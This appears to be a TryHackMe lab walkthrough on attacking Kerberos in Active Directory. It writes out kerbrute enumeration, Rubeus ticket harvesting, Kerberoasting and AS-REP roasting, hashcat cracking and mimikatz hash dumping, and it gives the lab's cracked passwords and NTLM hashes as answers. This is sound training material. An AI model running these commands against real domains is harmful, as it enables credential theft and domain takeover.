# Attacking Kerberos

{% embed url="https://tryhackme.com/room/attackingkerberos" %}
https://tryhackme.com/room/attackingkerberos
{% endembed %}

## Task 1 Introduction

Attack Privilege Requirements

* Kerbrute Enumeration - No domain access required&#x20;
* Pass the Ticket - Access as a user to the domain required
* Kerberoasting - Access as any user required
* AS-REP Roasting - Access as any user required
* Golden Ticket - Full domain compromise (domain admin) required&#x20;
* Silver Ticket - Service hash required&#x20;
* Skeleton Key - Full domain compromise (domain admin) required

#### What does TGT stand for?

{% hint style="success" %}
`Ticket Granting Ticket`
{% endhint %}

#### What does SPN stand for?

{% hint style="success" %}
Service Principle Name
{% endhint %}

#### What does PAC stand for?

{% hint style="success" %}
`Privilege Attribute Certificate`
{% endhint %}

#### What two services make up the KDC?

{% hint style="success" %}
`AS, TGS`
{% endhint %}

## Task 2 Enumeration w/ Kerbrute

```bash
echo '10.10.94.12  CONTROLLER.local' | sudo tee -a /etc/hosts
```

#### How many total users do we enumerate?

```bash
wget https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-27 22-11-00.png>)

{% hint style="success" %}
`10`
{% endhint %}

#### What is the SQL service account name?

{% hint style="success" %}
`sqlservice`
{% endhint %}

#### What is the second "machine" account name?

{% hint style="success" %}
`machine2`
{% endhint %}

#### What is the third "user" account name?

{% hint style="success" %}
`user3`
{% endhint %}

## Task 3 Harvesting & Brute-Forcing Tickets w/ Rubeus

#### Which domain admin do we get a ticket for when harvesting tickets?

```bash
ssh Administrator@controller.local
cd Downloads
Rubeus.exe harvest /interval:30
```

![](<../../.gitbook/assets/Screenshot from 2022-03-27 22-21-58.png>) ![](<../../.gitbook/assets/Screenshot from 2022-03-27 22-22-33.png>) ![](<../../.gitbook/assets/Screenshot from 2022-03-27 22-22-47.png>)

{% hint style="success" %}
`Administrator`
{% endhint %}

#### Which domain controller do we get a ticket for when harvesting tickets?

{% hint style="success" %}
`CONTROLLER-1`
{% endhint %}

## Task 4 Kerberoasting w/ Rubeus & Impacket

```bash
Rubeus.exe kerberoast /outfile:hash.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-27 22-32-25.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-27 22-32-51.png>)

```bash
scp 'Administrator@controller.local:/C:/Users/Administrator/Downloads/hash.txt' .
wget https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/Pass.txt
hashcat -a 0 -m 13100 hash.txt Pass.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-28 06-18-49.png>)

#### What is the HTTPService Password?

{% hint style="success" %}
`Summer2020`
{% endhint %}

#### What is the SQLService Password?

{% hint style="success" %}
`MYPassword123#`
{% endhint %}

## Task 5 AS-REP Roasting w/ Rubeus

```bash
Rubeus.exe asreproast /format:hashcat /outfile:hash.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-28 06-29-28.png>)

```bash
scp 'Administrator@controller.local:/C:/Users/Administrator/Downloads/hash.txt' .
hashcat -a 0 -m 18200 hash.txt Pass.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-28 06-38-38.png>)

#### What hash type does AS-REP Roasting use?

{% embed url="https://hashcat.net/wiki/doku.php?id=example_hashes" %}

{% hint style="success" %}
`Kerberos 5, etype 23, AS-REP`
{% endhint %}

#### Which User is vulnerable to AS-REP Roasting?

{% hint style="success" %}
`User3`
{% endhint %}

#### What is the User's Password?

{% hint style="success" %}
`Password3`
{% endhint %}

#### Which Admin is vulnerable to AS-REP Roasting?

{% hint style="success" %}
`Admin2`
{% endhint %}

#### What is the Admin's Password?

{% hint style="success" %}
`P@$$W0rd2`
{% endhint %}

## Task 7 Golden/Silver Ticket Attacks w/ mimikatz

```bash
xfreerdp /v:controller.local /u:administrator /p:'P@$$W0rd' /cert-ignore \
         +clipboard /dynamic-resolution /drive:share,/tmp
```

#### What is the SQLService NTLM Hash?

```bash
lsadump::lsa /inject /name:SQLService
```

![](<../../.gitbook/assets/Screenshot from 2022-03-28 19-57-59.png>)

{% hint style="success" %}
`cd40c9ed96265531b21fc5b1dafcfb0a`
{% endhint %}

#### What is the Administrator NTLM Hash?

```bash
lsadump::lsa /inject /name:Administrator
```

![](<../../.gitbook/assets/Screenshot from 2022-03-28 19-58-17.png>)

{% hint style="success" %}
`2777b7fec870e04dda00cd7260f7bee6`
{% endhint %}
